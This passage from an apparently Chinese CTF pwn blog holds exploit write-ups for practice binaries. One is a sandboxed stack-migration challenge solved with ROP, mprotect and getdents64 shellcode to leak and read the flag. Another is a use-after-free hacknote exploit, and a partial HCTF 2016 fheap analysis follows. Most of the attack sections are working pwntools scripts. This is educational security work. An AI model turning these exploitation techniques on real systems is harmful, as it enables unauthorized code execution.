io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(bin_sh)+p64(<span class="number">0x000000000040101a</span>)+p64(system_ad)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>发现没有拿到shell</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306122938871.png" alt="image-20230306122938871"></p><p>gdb跟了一下发现会执行到system(‘&#x2F;bin&#x2F;sh’)，又是开了沙箱，没有检测出来，发现题目给了提示有沙箱</p><h2 id="mprotect修改权限"><a href="#mprotect修改权限" class="headerlink" title="mprotect修改权限"></a>mprotect修改权限</h2><p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span>必须是一个内存页的起始地址</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line">从start开始修改len长度byte的权限为prot</span><br><span class="line">* start必须从必须是一个内存页的起始地地址 linux页一般<span class="number">4</span>k（<span class="number">0x1000b</span>yte）</span><br><span class="line">* len必须是页整数倍</span><br><span class="line">* part和linux文件权限一样 RWX</span><br></pre></td></tr></table></figure><p>我们需要先泄露文件名，看到要写入shellcode，这一步是必要的</p><p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(4096)+p64(poprdx_r12)+p64(0x7)+p64(0x6666)+p64(mprotect)+p64(main)</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306141247754.png" alt="image-20230306141247754"></p><p>修改完成rwx</p><h2 id="getdents64泄露文件名"><a href="#getdents64泄露文件名" class="headerlink" title="getdents64泄露文件名"></a>getdents64泄露文件名</h2><p>getdents64函数，它读取目录文件中的一个个目录项并返回</p><ul><li>参数一：fd指针</li><li>参数二：写入的内存区域</li><li>参数三：4096</li><li>功能：把当前文件目录下的文件名写入参数二指向的内存区域</li></ul><p>linux ls底层是调用getdents64函数实现的</p><p>我们用stace跟踪一些ls</p><blockquote><p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">ioctl(1, TIOCGWINSZ, &#123;ws_row=49, ws_col=102, ws_xpixel=1632, ws_ypixel=1568&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFDIR|0777, st_size=4096, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 23 entries */, 32768) = 800</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack\t  flag.txt&quot;..., 67) = 67</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack.py  get_st&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;ciscn_2019_c_1\t\t  get_started_3d&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;core\t\t\t  get_started_3dsctf_2016&quot;..., 68) = 68</span><br><span class="line">write(1, &quot;ctest\t\t\t  IDA\t\t\t\t       payload.&quot;..., 51) = 51</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><p>打开当前文件夹，然后读取到指定内存后通过write输出，这里的第一个payload数据的写入区最后选择bss段中间位置如mp_start+0x200，开头部分可能不行，官方wp</p><p>mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;来返回，我感觉mov rsi, 0x%x;push rsi; ret;就可以，也打通了，不知道为什么要多一层syscall</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br></pre></td></tr></table></figure><p>泄露出文件名，正常读取就可以，因为我们没有关闭前一个打开的fd指针，所以这里文件指针变为4</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230307000430195.png" alt="image-20230307000430195"></p><h2 id="EXP-这里其实可以封装个函数，懒得搞了"><a href="#EXP-这里其实可以封装个函数，懒得搞了" class="headerlink" title="EXP 这里其实可以封装个函数，懒得搞了"></a>EXP 这里其实可以封装个函数，懒得搞了</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./grxer???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))+base</span><br><span class="line">poprsi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))+base</span><br><span class="line">poprdx_r12=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))+base</span><br><span class="line">p(<span class="string">&#x27;poprdi&#x27;</span>,poprdi)</span><br><span class="line">p(<span class="string">&#x27;poprsi&#x27;</span>,poprsi)</span><br><span class="line">p(<span class="string">&#x27;poprdx&#x27;</span>,poprdx_r12)</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+base</span><br><span class="line">read_ad=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+base</span><br><span class="line">mp_start=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(<span class="number">4096</span>)+p64(poprdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x6666</span>)+p64(mprotect)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi, 0x%x;push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">flag=r(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag---&gt;&#x27;</span>+flag.decode())</span><br><span class="line">flagname=<span class="string">&#x27;./flag&#x27;</span>+flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flagname)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line"><span class="comment"># sa(b&#x27;\x96\x88\n\n&#x27;,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
            <tag> Sandbox </tag>
            
            <tag> Getdents64 Leak </tag>
            
            <tag> Mprotect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Using-After-Free</title>
      <link href="/2023/03/04/Using-After-Free/"/>
      <url>/2023/03/04/Using-After-Free/</url>
      
        <content type="html"><![CDATA[<h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p><span id="more"></span><h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p><p>题目可以最多创建5个note,会放在全局变量notelist里(00x804A070)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>后没有将指针置为<span class="number">0</span></span><br></pre></td></tr></table></figure><p>print_note里有</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure><p>有后门函数magic</p><p>如果我们可以控制notelist[v1]-&gt;put为magic就可以拿到flag</p><p>在 add_note里我们会先malloc note结构体，后面会再申请context的内存，del时会先</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure><p>我们先</p><p>addnote(16, b”aaaa”) # add note 0<br>addnote(16, b”ddaa”) # add note 1</p><p>第一次malloc</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p><p>第二次</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p><p>依次malloc，堆的是这样的</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p><p>我们去free</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p><h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong>机制是在<strong>libc-2.26</strong>中引入，小于0x400的堆，<strong>FILO</strong>(先进后出)的单循环链表、精确分配(不切割)、<strong>free</strong>后为防止合并后一个堆块的<strong>inuse</strong>位不置<strong>0</strong>，大小低于<strong>0x400</strong>字节的堆块时会首先放入<strong>Tcachebin</strong>，每个bins最多存放7个chunk，malloc在申请大小低于<strong>0x400</strong>的堆块时</p><p>再次申请</p><p>addnote(8, p32(magic))</p><p>这里都需要0x10大小的chunk，刚好有两个</p><p>这样我们修改note3的context内容也就修改了note1的put指针</p><p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p><p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h2><p><a href="https://github.com/zh-explorer/hctf2016-fheap">https://github.com/zh-explorer/hctf2016-fheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; ./pwn-f </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">So, let&#x27;s crash the world</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">1.create string</span><br><span class="line">2.delete string</span><br><span class="line">3.quit</span><br><span class="line">^C⏎                                                                                                                                             grxer@grxer ~/D/c/p/heap [SIGINT]&gt; checksec pwn-f </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/pwn-f&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>功能很简单，再create时会malloc一个结构体，string长度&gt;0xf会再次申请一块内存,&lt;直接存在了结构体里，直接推测出结构体大致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *buf;</span><br><span class="line">        <span class="type">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="comment">//这里会填充8字节以满足结构体对齐规则 </span></span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>存在一个结构体数组的全局变量在0x2020C0来存储chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>]; 大小为<span class="number">16</span>字节</span><br></pre></td></tr></table></figure><p>删除时只是简单free没有null 产生dangling pointer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0x11</span> )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD *)&amp;struct_at</span><br><span class="line">                                                                                        + <span class="number">2</span> * (<span class="type">int</span>)v1</span><br><span class="line">                                                                                        + <span class="number">1</span>));</span><br><span class="line">    *((_DWORD *)&amp;struct_at + <span class="number">4</span> * (<span class="type">int</span>)v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create(10,’hello’)<br>create(0x20,’grxer666666666666666666666666666’)</p><img src="/2023/03/04/Using-After-Free/image-20230307152831940.png" 